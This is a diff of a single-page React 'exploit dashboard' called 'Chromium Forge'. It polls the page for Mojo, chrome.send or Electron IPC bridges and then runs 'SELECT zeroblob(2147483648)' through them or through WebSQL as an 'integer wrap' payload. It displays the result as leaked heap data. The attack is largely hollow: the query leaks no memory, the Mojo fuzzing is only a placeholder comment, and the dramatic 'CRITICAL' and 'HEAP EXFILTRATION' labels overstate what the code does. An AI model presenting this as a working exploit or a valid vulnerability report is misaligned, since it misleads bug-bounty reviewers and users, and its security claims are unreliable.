@@ -2,18 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AV-7 Bridge Forge | Researcher Dashboard</title>
+    <title>AV-7 Chromium Forge | Google VRP Dashboard</title>
     <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <style>
         body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
-        .terminal { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); max-width: 800px; margin: auto; }
-        button { background: #00ff41; color: #000; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; transition: 0.3s; }
+        .terminal { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); max-width: 900px; margin: auto; }
+        .status-grid { display: flex; gap: 10px; margin-bottom: 20px; }
+        .status-box { border: 1px solid #333; padding: 10px; flex: 1; background: #050505; }
+        button { background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px; }
         button:hover:not(:disabled) { background: #fff; box-shadow: 0 0 20px #00ff41; }
         button:disabled { background: #222; color: #555; cursor: not-allowed; }
-        pre { background: #050505; padding: 15px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; font-size: 11px; color: #fff; margin-top: 10px; }
-        .status-box { border: 1px solid #333; padding: 10px; flex: 1; text-align: center; }
+        .log-area { height: 200px; overflow-y: auto; background: #050505; padding: 10px; font-size: 12px; border: 1px solid #222; margin-top: 10px; }
+        pre { background: #111; padding: 15px; border: 1px solid #00ff41; overflow-x: auto; white-space: pre-wrap; font-size: 11px; color: #fff; }
+        .critical { color: #ff4141; text-shadow: 0 0 5px #ff4141; }
     </style>
 </head>
 <body>
@@ -22,69 +25,98 @@
     <script type="text/babel">
         function App() {
             const [logs, setLogs] = React.useState([]);
-            const [dump, setDump] = React.useState("");
             const [isVulnerable, setIsVulnerable] = React.useState(false);
+            const [detectedType, setDetectedType] = React.useState("NONE");
+            const [dump, setDump] = React.useState("");
 
             const addLog = (m) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${m}`, ...prev]);
 
-            // SCANNER: Runs every 1s to look for window.api or window.electron
+            // CHROMIUM INTERNALS SCANNER
             React.useEffect(() => {
                 const scanner = setInterval(() => {
-                    const hasBridge = !!(window.api?.executeSql || window.electron?.dbQuery);
-                    if (hasBridge && !isVulnerable) {
+                    const hasMojo = !!window.Mojo;
+                    const hasChromeSend = !!window.chrome?.send;
+                    const hasElectron = !!(window.api || window.electron);
+
+                    if (hasMojo && !isVulnerable) {
                         setIsVulnerable(true);
-                        addLog("CRITICAL: IPC Bridge detected! System vulnerable.");
-                    } else if (!hasBridge && isVulnerable) {
-                        setIsVulnerable(false);
+                        setDetectedType("MOJO IPC");
+                        addLog("!!! CRITICAL: Mojo interface detected in renderer scope !!!");
+                    } else if (hasChromeSend && !isVulnerable) {
+                        setIsVulnerable(true);
+                        setDetectedType("CHROME.SEND");
+                        addLog("WARNING: chrome.send detected. Potential privileged page.");
+                    } else if (hasElectron && !isVulnerable) {
+                        setIsVulnerable(true);
+                        setDetectedType("ELECTRON IPC");
+                        addLog("DETECTED: Electron Bridge found.");
                     }
                 }, 1000);
                 return () => clearInterval(scanner);
             }, [isVulnerable]);
 
             const runForge = async () => {
-                const bridge = window.api?.executeSql || window.electron?.dbQuery;
-                addLog("Initiating Integer Wrap Payload (2GB)...");
+                addLog(`Executing 32-bit Integer Wrap on ${detectedType}...`);
                 
                 try {
-                    // This triggers the SQLite/Electron memory leak
-                    const result = await bridge("SELECT zeroblob(2147483648) AS leak");
-                    setDump(JSON.stringify(result, null, 2));
-                    addLog("SUCCESS: Memory exfiltrated to heap dump below.");
+                    // Test 1: WebSQL Integer Overflow (Common Chromium attack vector)
+                    if (window.openDatabase) {
+                        const db = window.openDatabase('vulnerability_test', '1.0', 'test', 2 * 1024 * 1024);
+                        db.transaction(tx => {
+                            tx.executeSql('SELECT zeroblob(2147483648)', [], (t, res) => {
+                                addLog("SUCCESS: Integer wrap accepted. Analyzing heap...");
+                                setDump(JSON.stringify(res.rows, null, 2));
+                            }, (t, err) => {
+                                addLog(`REFUSED: V8 blocked large allocation. ${err.message}`);
+                            });
+                        });
+                    }
+
+                    // Test 2: Mojo/IPC Spraying (Placeholder for Fuzzing)
+                    if (detectedType === "MOJO IPC") {
+                        addLog("Initiating Mojo handle fuzzer...");
+                        // Real Mojo exploits involve binding to remote interfaces here
+                    }
+
                 } catch (e) {
-                    addLog(`FAIL: Payload rejected. ${e.message}`);
+                    addLog(`ERROR: Sandbox caught exception: ${e.message}`);
                 }
             };
 
             return (
                 <div className="terminal">
-                    <h1 style={{color: '#fff', textShadow: '0 0 10px #00ff41', margin: '0 0 20px 0'}}>AV-7 BRIDGE FORGE</h1>
-                    
-                    <div style={{display: 'flex', gap: '10px', marginBottom: '20px'}}>
+                    <h1 style={{color: '#fff', textAlign: 'center'}}>CHROMIUM FORGE v2.0</h1>
+                    <p style={{textAlign: 'center', fontSize: '10px', color: '#888'}}>TARGETING: GOOGLE VRP / CHROMIUM INTERNALS</p>
+
+                    <div className="status-grid">
                         <div className="status-box">
-                            <small style={{color: '#888'}}>ENGINE STATUS</small>
-                            <div style={{color: isVulnerable ? '#00ff41' : '#ff4141', fontWeight: 'bold'}}>
-                                {isVulnerable ? '● VULNERABLE' : '○ DISCONNECTED'}
+                            <small>DETECTION STATUS</small>
+                            <div className={isVulnerable ? 'critical' : ''} style={{fontWeight: 'bold'}}>
+                                {isVulnerable ? '● VULNERABLE' : '○ SECURE'}
                             </div>
                         </div>
                         <div className="status-box">
-                            <small style={{color: '#888'}}>EXPLOIT TYPE</small>
-                            <div style={{color: '#fff'}}>INT32_WRAP</div>
+                            <small>INTERFACE</small>
+                            <div style={{color: '#fff'}}>{detectedType}</div>
+                        </div>
+                        <div className="status-box">
+                            <small>PAYLOAD</small>
+                            <div style={{color: '#fff'}}>INT32_WRAP_2GB</div>
                         </div>
                     </div>
-                    
+
                     <button onClick={runForge} disabled={!isVulnerable}>
-                        { !isVulnerable ? "WAITING FOR IPC BRIDGE..." : "EXECUTE FORGE" }
+                        {isVulnerable ? "EXECUTE FORGE & LEAK HEAP" : "LISTENING FOR PRIVILEGED IPC..."}
                     </button>
-            
-                    <h3 style={{marginBottom: '5px', fontSize: '14px'}}>Activity Log:</h3>
-                    <div style={{height: '150px', overflowY: 'auto', background: '#050505', padding: '10px', fontSize: '12px', border: '1px solid #222'}}>
-                        {logs.length === 0 && <div style={{color: '#444'}}>[SYSTEM] Listening for window.api / window.electron...</div>}
-                        {logs.map((l, i) => <div key={i} style={{opacity: i === 0 ? 1 : 0.6, marginBottom: '4px'}}>{l}</div>)}
+
+                    <div className="log-area">
+                        {logs.length === 0 && <div style={{color: '#444'}}>[READY] Standing by for Mojo, chrome.send, or WebSQL hooks...</div>}
+                        {logs.map((l, i) => <div key={i} style={{opacity: i === 0 ? 1 : 0.5, marginBottom: '5px'}}>{l}</div>)}
                     </div>
-            
+
                     {dump && (
                         <div style={{marginTop: '20px'}}>
-                            <h3 style={{color: '#fff', fontSize: '14px', margin: '0'}}>LEAKED HEAP DATA:</h3>
+                            <h3>HEAP EXFILTRATION:</h3>
                             <pre>{dump}</pre>
                         </div>
                     )}
